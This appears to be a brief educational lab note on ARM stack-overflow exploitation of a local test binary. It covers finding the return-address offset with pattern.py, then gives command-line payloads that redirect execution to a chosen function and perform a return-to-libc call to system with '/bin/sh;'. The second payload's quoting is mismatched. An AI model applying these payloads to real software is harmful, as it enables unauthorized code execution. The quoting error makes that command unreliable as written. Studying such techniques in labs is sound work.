## Env
see [this](https://blog.csdn.net/u012313335/article/details/53405734) to set up your environment.

## simple stack-overflow
Use pattern.py to get the offset to the return-address.
```
./pattern.py create 30
./pattern.py offset string
```
It's just like the intel assemble, first the return-address(lr register) is pushed into stack, and then 
the frame pointer(r11).
After ensure the offset, overwrite the return-address with donuts' address.
```
./test `python -c "print '1234567890123456\x9c\x04\x01\x00'"`
```

## return to libc
Turn off ASLR and get the address of system. And for some reasons, we don't need to set the argument, because r0 is not changed and we can make it point to a string including '/bin/sh;'. 
```
./test `python -c "print "/bin/sh;##123456\x54\xb1\xe9\x76'"`
```
